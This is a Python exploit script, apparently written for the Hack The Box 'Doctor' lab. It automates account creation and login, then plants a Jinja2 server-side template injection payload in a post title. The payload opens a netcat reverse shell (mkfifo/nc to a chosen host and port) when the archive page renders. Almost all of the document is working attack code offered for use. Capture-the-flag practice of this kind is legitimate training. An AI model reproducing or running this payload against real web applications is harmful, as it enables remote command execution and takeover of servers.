#!/usr/bin/python3

# Create, login, generate post and deploy Reverse Shell exploiting SSTinjection
#                                                       by. lanz

import requests, time, argparse, base64
from pwn import *

email = "fasif29169@wncnw.com"
url_page = "http://doctors.htb"

class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

banner = base64.b64decode("4pWl4pSA4pSA4pWW4pWT4pSA4pSA4pWW4pWT4pSA4pSAIOKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVlgrilZEgIOKVkeKVkSAg4pWR4pWRICAg4pWZ4pSC4pSC4pWc4pWRICDilZHilZHilIDilIDilZwKICAg4pWr4pWrICDilZHilasgICAg4pSC4pSCIOKVqyAg4pWR4pWr4pSA4pSA4pWWCuKUgOKUgOKUgOKVnOKVmeKUgOKUgOKVnOKVmeKUgOKUgOKUgOKUgOKUtOKUtCDilZnilIDilIDilZzilaggIOKVqOKAoiBCeSBsYW56ZgoKU2VydmVyIFNpdGUgVGVtcGxhdGUgSW5qZWN0aW9uIDo6IFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbi4gCg==").decode()

print("\n" + Color.BLUE + banner + Color.END)

def arguments():
    parse = argparse.ArgumentParser(description='Reverse Shell whit Server-Side Template Injection - HTB Doctor')
    parse.add_argument('-u', dest='username', type=str, required=True, help='Username to create account')
    parse.add_argument('-p', dest='password', type=str, required=True, help='Password to create account')
    parse.add_argument('-lhost', dest='lhost', type=str, required=True, help='IP to generate reverse shell')
    parse.add_argument('-lport', dest='lport', type=int, required=True, help='PORT to generate reverse shell')
    return parse.parse_args()

def create_user(username, password):
    session = requests.Session()

    p1 = log.progress("Creating user " + Color.BLUE + "%s" % (username) + Color.END)
    time.sleep(2)

    data_post = {
        "username" : username,
        "email" : email,
        "password" : password,
        "confirm_password" : password,
        "submit" : "Sign+Up"
    }

    r = session.post(url_page + "/register", data=data_post)

    p1.success("Done")
    time.sleep(1)

def login(username, password):
    session = requests.Session()

    #Login
    p2 = log.progress("Login with " + Color.BLUE + "%s" % (username) + Color.END)
    time.sleep(2)

    data_post = {
        "email" : email,
        "password" : password,
        "submit" : "Login"
    }

    r = session.post(url_page + "/login", data=data_post)

    cookie = session.cookies.get_dict()

    p2.success("Done")
    time.sleep(1)

    return cookie

def create_post(username, password, lhost, lport, cookie):
    session = requests.Session()

    p3 = log.progress("Create post with " + Color.BLUE + "malicious SSTi" + Color.END)
    time.sleep(2)

    r = session.get(url_page + "/home", cookies=cookie)

    #If a post exist, avoid create the same
    if (lhost in r.text) and (str(lport) in r.text):
        p3.success("There is a same post in your profile. " + Color.YELLOW + "Executing that..." + Color.END)
        time.sleep(2)
    else:
        payload = "{{''.__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc " + lhost + " " + str(lport) + " >/tmp/f',shell=True,stdout=-1).communicate()}}"
        data_post = {
            "title" : payload,
            "content" : "any7Hing",
            "submit" : "Post"
        }

        r = session.post(url_page + "/post/new", data=data_post, cookies=cookie)

        p3.success("Done")
        time.sleep(1)


def generate_reverse_shell(lhost, lport, cookie):
    session = requests.Session()

    p4 = log.progress("Generating reverse shell to " + Color.BLUE + "%s:%d" % (lhost, lport) + Color.END)

    try:
        r = session.get(url_page + "/archive", cookies=cookie, timeout=2)
        p4.failure(Color.RED + "Something was wrong with requests or your listening!" + Color.END)

    except requests.exceptions.ReadTimeout:
        p4.success(Color.YELLOW + "W3 aR3 iZs1d3!" + Color.END)

if __name__ == '__main__':
    args = arguments()
    create_user(args.username, args.password)
    cookie = login(args.username, args.password)
    create_post(args.username, args.password, args.lhost, args.lport, cookie)
    generate_reverse_shell(args.lhost, args.lport, cookie)
